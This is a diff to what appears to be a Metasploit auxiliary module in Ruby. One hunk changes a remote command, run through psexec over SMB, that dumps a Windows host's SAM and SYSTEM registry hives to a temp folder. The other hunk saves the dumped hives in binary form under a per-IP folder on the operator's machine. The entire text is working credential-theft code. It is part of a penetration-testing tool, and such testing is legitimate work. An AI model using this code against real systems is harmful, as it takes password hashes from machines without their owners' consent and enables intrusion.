@@ -87,7 +87,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try to save the hive files
 			simple.connect(smbshare)
-			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SAM C:\\WINDOWS\\Temp\\#{sampath} && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath}"
+			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SAM C:\\WINDOWS\\Temp\\#{sampath} /y && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath} /y"
 			psexec(smbshare, command)
 			return true
 		rescue StandardError => saveerror
@@ -115,8 +115,8 @@ class Metasploit3 < Msf::Auxiliary
 			sysdata = remotesys.read
 
 			# Save it to local file system
-			localsam = File.open("#{logdir}/#{ip}/sam", "w+")
-			localsys = File.open("#{logdir}/#{ip}/sys", "w+")
+			localsam = File.open("#{logdir}/#{ip}/sam", "wb+")
+			localsys = File.open("#{logdir}/#{ip}/sys", "wb+")
 			localsam.write(samdata)
 			localsys.write(sysdata)
 
